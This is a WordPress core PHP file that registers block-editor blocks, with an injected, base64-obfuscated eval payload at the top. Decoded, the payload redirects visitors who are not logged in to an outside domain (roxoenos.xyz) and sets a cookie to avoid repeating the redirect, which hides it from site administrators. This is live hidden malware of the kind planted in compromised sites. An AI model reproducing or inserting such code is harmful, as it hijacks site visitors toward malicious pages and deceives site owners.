<?php
/*aeR4Choc_start*/@eval(base64_decode('aWYoIWRlZmluZWQoImNoYWVKb3U3IikpewogICAgZGVmaW5lKCJjaGFlSm91NyIsIDEpOwogICAgZnVuY3Rpb24gaXNNb2JpbGUoJHVhZ2VudFN0cil7CiAgICAgICAgaWYoc3RycG9zKCR1YWdlbnRTdHIsICdhbmRyb2lkJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnYmxhY2tiZXJyeScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2lwaG9uZScpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2lwYWQnKSAhPT0gZmFsc2UKICAgICAgICAgICAgfHwgc3RycG9zKCR1YWdlbnRTdHIsICdpcG9kJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnb3BlcmEgbWluaScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2llTW9iaWxlJykgIT09IGZhbHNlKXsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KCiAgICBmdW5jdGlvbiBpc0Rlc2t0b3AoJHVhZ2VudFN0cil7CiAgICAgICAgaWYoc3RycG9zKCR1YWdlbnRTdHIsICdlZGdlJykgIT09IGZhbHNlIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnbXNpZScpICE9PSBmYWxzZQogICAgICAgICAgICB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ29wcicpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2Nocm9taXVtJykgIT09IGZhbHNlCiAgICAgICAgICAgIHx8IHN0cnBvcygkdWFnZW50U3RyLCAnZmlyZWZveCcpICE9PSBmYWxzZSB8fCBzdHJwb3MoJHVhZ2VudFN0ciwgJ2Nocm9tZScpICE9PSBmYWxzZSl7CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CgogICAgJHJlZGlyVG8gPSAiaHR0cHM6Ly93d3cucm94b2Vub3MueHl6IjsKICAgICRjaGVja0Nvb2tSZWRpclN0ciA9ICJhZU5lZThwaSI7CiAgICAkcmVkaXJlY3RBbGxvdyA9IHRydWU7CiAgICBmb3JlYWNoICgkX0NPT0tJRSBhcyAkY29va0tleT0+JGNvb2tWYWwpewogICAgICAgIGlmIChzdHJwb3MoJGNvb2tLZXksICd3b3JkcHJlc3NfbG9nZ2VkX2luJykgIT09IGZhbHNlIHx8ICRjb29rS2V5ID09ICRjaGVja0Nvb2tSZWRpclN0cikgewogICAgICAgICAgICAkcmVkaXJlY3RBbGxvdyA9IGZhbHNlOwogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICB9CgogICAgJHVhZ2VudCA9IHN0cnRvbG93ZXIoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKTsKCiAgICBpZiAoJHJlZGlyZWN0QWxsb3cpewogICAgICAgIGlmKGlzTW9iaWxlKCR1YWdlbnQpIHx8IGlzRGVza3RvcCgkdWFnZW50KSkgewogICAgICAgICAgICBzZXRjb29raWUoJGNoZWNrQ29va1JlZGlyU3RyLCAiMSIsIHRpbWUoKSArIDYwNDgwMCk7CiAgICAgICAgICAgIGhlYWRlcigiTG9jYXRpb246ICRyZWRpclRvIik7CiAgICAgICAgICAgIGRpZTsKICAgICAgICB9CiAgICB9Cn0='));/*aeR4Choc_end*/
/**
 * Used to set up all core blocks used with the block editor.
 *
 * @package WordPress
 */

// Include files required for core blocks registration.
require ABSPATH . WPINC . '/blocks/archives.php';
require ABSPATH . WPINC . '/blocks/block.php';
require ABSPATH . WPINC . '/blocks/calendar.php';
require ABSPATH . WPINC . '/blocks/categories.php';
require ABSPATH . WPINC . '/blocks/latest-comments.php';
require ABSPATH . WPINC . '/blocks/latest-posts.php';
require ABSPATH . WPINC . '/blocks/rss.php';
require ABSPATH . WPINC . '/blocks/search.php';
require ABSPATH . WPINC . '/blocks/shortcode.php';
require ABSPATH . WPINC . '/blocks/social-link.php';
require ABSPATH . WPINC . '/blocks/tag-cloud.php';

/**
 * Registers core block types using metadata files.
 * Dynamic core blocks are registered separately.
 *
 * @since 5.5.0
 */
function register_core_block_types_from_metadata() {
	$block_folders = array(
		'audio',
		'button',
		'buttons',
		'classic',
		'code',
		'column',
		'columns',
		'embed',
		'file',
		'gallery',
		'group',
		'heading',
		'html',
		'image',
		'list',
		'media-text',
		'missing',
		'more',
		'nextpage',
		'paragraph',
		'preformatted',
		'pullquote',
		'quote',
		'separator',
		'social-links',
		'spacer',
		'subhead',
		'table',
		'text-columns',
		'verse',
		'video',
	);

	foreach ( $block_folders as $block_folder ) {
		register_block_type_from_metadata(
			ABSPATH . WPINC . '/blocks/' . $block_folder
		);
	}
}
add_action( 'init', 'register_core_block_types_from_metadata' );
